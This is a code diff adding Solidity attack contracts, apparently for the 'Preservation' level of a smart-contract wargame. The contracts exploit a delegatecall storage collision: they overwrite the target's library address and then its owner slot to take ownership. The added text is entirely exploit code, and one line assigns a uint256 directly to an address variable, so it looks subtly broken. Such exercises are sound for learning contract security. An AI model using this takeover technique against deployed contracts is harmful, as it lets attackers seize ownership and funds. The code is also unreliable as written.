@@ -38,3 +38,36 @@ contract LibraryContract {
     storedTime = _time;
   }
 }
+
+contract PreservationHack {
+
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner;
+  Preservation public preservation;
+
+    constructor(address preservationAdr) public {
+        preservation = Preservation(preservationAdr);
+    }
+
+  function callSetFirstTime() external {
+    preservation.setFirstTime(uint256(uint160(address(this))));
+    preservation.setFirstTime(uint256(uint160(msg.sender)));
+  }
+
+  function setTime(uint256 _owner) public {
+    owner = _owner;
+  }
+}
+
+contract PreservationConsoleHack {
+
+    address public t1;
+    address public t2;
+    address public owner;
+
+    function setTime(uint256) public {
+        owner = msg.sender;
+    }
+
+}
